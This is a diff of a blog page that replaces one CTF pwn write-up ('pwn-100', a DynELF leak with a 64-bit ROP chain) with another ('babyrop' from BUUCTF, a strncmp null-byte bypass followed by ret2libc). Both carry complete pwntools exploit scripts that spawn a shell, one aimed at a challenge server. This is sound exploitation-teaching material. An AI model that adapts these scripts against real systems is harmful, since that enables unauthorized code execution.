@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,栈溢出,ROP,">
+  <meta name="keywords" content="pwn,ROP,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="在没有目标系统libc文件下，如何泄露地址信息——pwntools的DynELF模块。">
-<meta name="keywords" content="pwn,栈溢出,ROP">
+<meta name="description" content="buu刷题之旅~">
+<meta name="keywords" content="pwn,ROP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界 pwn-100">
-<meta property="og:url" content="http://suvii22.github.io/2019/09/28/攻防世界-pwn-100/index.html">
+<meta property="og:title" content="babyrop">
+<meta property="og:url" content="http://suvii22.github.io/2019/11/24/babyrop/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="在没有目标系统libc文件下，如何泄露地址信息——pwntools的DynELF模块。">
+<meta property="og:description" content="buu刷题之旅~">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-11-24T02:41:04.657Z">
+<meta property="og:updated_time" content="2019-11-24T09:11:52.737Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界 pwn-100">
-<meta name="twitter:description" content="在没有目标系统libc文件下，如何泄露地址信息——pwntools的DynELF模块。">
+<meta name="twitter:title" content="babyrop">
+<meta name="twitter:description" content="buu刷题之旅~">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://suvii22.github.io/2019/09/28/攻防世界-pwn-100/">
+  <link rel="canonical" href="http://suvii22.github.io/2019/11/24/babyrop/">
 
 
 
 
 
-  <title>攻防世界 pwn-100 | Apr1L's blog</title>
+  <title>babyrop | Apr1L's blog</title>
   
 
 
@@ -273,7 +273,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/09/28/攻防世界-pwn-100/">
+    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/11/24/babyrop/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Apr1L">
@@ -290,7 +290,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">攻防世界 pwn-100</h1>
+          <h1 class="post-title" itemprop="name headline">babyrop</h1>
         
 
         <div class="post-meta">
@@ -302,8 +302,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-28T19:16:38+08:00">
-                2019-09-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-24T16:55:22+08:00">
+                2019-11-24
               </time>
             
 
@@ -347,8 +347,8 @@
                 
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/wp/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
+                  <a href="/categories/pwn/wp/BUUCTF/" itemprop="url" rel="index">
+                    <span itemprop="name">BUUCTF</span>
                   </a>
                 </span>
 
@@ -384,24 +384,17 @@
       
 
       
-        <p>在没有目标系统libc文件下，如何泄露地址信息——pwntools的DynELF模块。</p>
+        <p>buu刷题之旅~</p>
 <a id="more"></a>
-<h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = process(&apos;./xxx&apos;)</span><br><span class="line">def leak(address):</span><br><span class="line">  #各种预处理</span><br><span class="line">  payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;</span><br><span class="line">  p.send(payload)</span><br><span class="line">  #各种处理</span><br><span class="line">  data = p.recv(4)</span><br><span class="line">  log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;)))</span><br><span class="line">  return data</span><br><span class="line">d = DynELF(leak, elf=ELF(&quot;./xxx&quot;))      #初始化DynELF模块 </span><br><span class="line">systemAddress = d.lookup(&apos;system&apos;, &apos;libc&apos;)  #在libc文件中搜索system函数的地址</span><br></pre></td></tr></table></figure>
+<h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>程序主要代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">if ( fd &gt; 0 )</span><br><span class="line">  read(fd, &amp;buf, 4u);</span><br><span class="line">v2 = sub_804871F(buf);</span><br><span class="line">sub_80487D0(v2);</span><br></pre></td></tr></table></figure>
 
-<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ul>
-<li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内</li>
-<li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息</li>
-</ul>
-<h2 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h2><p>下面来说说咱们这个程序：首先程序存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但这个程序是64位，故：</p>
-<ul>
-<li>64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局</li>
-<li>puts函数与write函数不同，不能指定输出字符串的长度<br>在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见<a href="https://sirhc.gitbook.io/note/pwn/libccsuinit-han-shu-de-tong-yong-gadget" target="_blank" rel="noopener"><strong>文章</strong></a>。</li>
-</ul>
-<p>exp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn1&apos;)</span><br><span class="line">#p = remote(&apos;111.198.29.45&apos;,46889)</span><br><span class="line"></span><br><span class="line">pop1 = 0x40075a</span><br><span class="line">pop2 = 0x400740</span><br><span class="line">elf = ELF(&apos;./pwn1&apos;)</span><br><span class="line">readplt = elf.symbols[&apos;read&apos;]</span><br><span class="line">readgot = elf.got[&apos;read&apos;]</span><br><span class="line">putsplt = elf.symbols[&apos;puts&apos;]</span><br><span class="line">putsgot = elf.got[&apos;puts&apos;]</span><br><span class="line">main = 0x4006b8</span><br><span class="line">start = 0x400550</span><br><span class="line">pop_rdi = 0x400763</span><br><span class="line">wri = 0x601000</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">    </span><br><span class="line">    count = 0</span><br><span class="line">    data = &apos;&apos;</span><br><span class="line">    </span><br><span class="line">    payload = &apos;a&apos;*0x48</span><br><span class="line">    payload += p64(pop_rdi) + p64(address)</span><br><span class="line">    payload += p64(putsplt)</span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload = payload.ljust(200,&apos;b&apos;)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    print p.recvuntil(&apos;bye~\n&apos;)</span><br><span class="line"></span><br><span class="line">    up = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line"></span><br><span class="line">        c = p.recv(numb=1,timeout=0.1)</span><br><span class="line">        count += 1</span><br><span class="line">	</span><br><span class="line">	if up == &apos;\n&apos; and c == &quot;&quot;:</span><br><span class="line">	    data = data[:-1]</span><br><span class="line">            data += &quot;\x00&quot;</span><br><span class="line">	    break</span><br><span class="line">	else:</span><br><span class="line">	    data += c</span><br><span class="line">	up = c</span><br><span class="line"></span><br><span class="line">    data = data[:4]</span><br><span class="line">    log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;)))</span><br><span class="line"></span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(&apos;./pwn1&apos;))</span><br><span class="line"></span><br><span class="line">sysaddr = d.lookup(&apos;system&apos;,&apos;libc&apos;)</span><br><span class="line"></span><br><span class="line">print &quot;sysaddr:&quot;, hex(sysaddr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#write binsh to bss</span><br><span class="line">payload1 = &apos;a&apos;*0x48</span><br><span class="line">payload1 +=p64(pop1) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(wri) +p64(0)</span><br><span class="line">payload1 +=p64(pop2)</span><br><span class="line">payload1 +=&apos;\x00&apos;*56</span><br><span class="line">payload1 +=p64(start)	 </span><br><span class="line">payload1 = payload1.ljust(200,&quot;b&quot;)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">print p.recvuntil(&apos;bye~\n&apos;)</span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">#getshell</span><br><span class="line">payload2 = &quot;a&quot;*0x48</span><br><span class="line">payload2 +=p64(pop_rdi)+p64(wri)</span><br><span class="line">payload2 +=p64(sysaddr)</span><br><span class="line">payload2 +=p64(start)</span><br><span class="line">payload2 = payload2.ljust(200,&quot;b&quot;)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&amp;s, &quot;%ld&quot;, a1);</span><br><span class="line">v6 = read(0, buf, 0x20u);</span><br><span class="line">buf[v6 - 1] = 0;</span><br><span class="line">v1 = strlen(buf);</span><br><span class="line">if ( strncmp(buf, &amp;s, v1) )</span><br><span class="line">   exit(0);</span><br><span class="line">write(1, &quot;Correct\n&quot;, 8u);</span><br></pre></td></tr></table></figure>
 
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">借助DynELF实现无libc的漏洞利用小结</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener">中级ROP</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 == &apos;&apos; )</span><br><span class="line">    result = read(0, &amp;buf, 200u);</span><br><span class="line">else</span><br><span class="line">    result = read(0, &amp;buf, a1);</span><br></pre></td></tr></table></figure>
 
+<p>程序一开始生成一个随机数，然后与我们的输入进行比较。我们可以让输入的首字节为\x00，因为strncmp遇到\x00会停止，这样v1=0，从而绕过strncmp。然后常规ROP就ok了。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p = process(&apos;./babyrop&apos;)</span><br><span class="line">p = remote(&apos;node3.buuoj.cn&apos;,28993)</span><br><span class="line">elf = ELF(&apos;./babyrop&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">main = 0x8048825</span><br><span class="line">bin_sh = 0x0015902b</span><br><span class="line">payload = &apos;\x00&apos;+&apos;\xff&apos;*7</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">offset = 0xe7+4</span><br><span class="line">p.recvuntil(&apos;Correct\n&apos;)</span><br><span class="line">payload = &apos;a&apos;*offset+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(4))</span><br><span class="line">libcbase = write_addr-libc.symbols[&apos;write&apos;]</span><br><span class="line">system_addr=libcbase + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr=libcbase + bin_sh</span><br><span class="line">payload = &apos;\x00&apos;+&apos;\xff&apos;*7</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ffset = 0xe7+4</span><br><span class="line">p.recvuntil(&apos;Correct\n&apos;)</span><br><span class="line">payload = &apos;a&apos;*offset+p32(system_addr)+&apos;aaaa&apos;+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -420,8 +413,6 @@
           
             <a href="/tags/pwn/" rel="tag"># pwn</a>
           
-            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
-          
             <a href="/tags/ROP/" rel="tag"># ROP</a>
           
         </div>
@@ -435,15 +426,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/11/24/Syc-Geek-10th-Baby-shellcode/" rel="next" title="Syc Geek 10th -Baby shellcode">
+                <i class="fa fa-chevron-left"></i> Syc Geek 10th -Baby shellcode
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/09/29/攻防世界-Mary-Morton/" rel="prev" title="攻防世界 Mary_Morton">
-                攻防世界 Mary_Morton <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -577,7 +568,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DynELF"><span class="nav-number">1.</span> <span class="nav-text">DynELF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用条件"><span class="nav-number">2.</span> <span class="nav-text">使用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-100"><span class="nav-number">3.</span> <span class="nav-text">pwn-100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关链接"><span class="nav-number">4.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析程序"><span class="nav-number">1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">2.</span> <span class="nav-text">EXP</span></a></li></ol></div>
             
 
           </div>
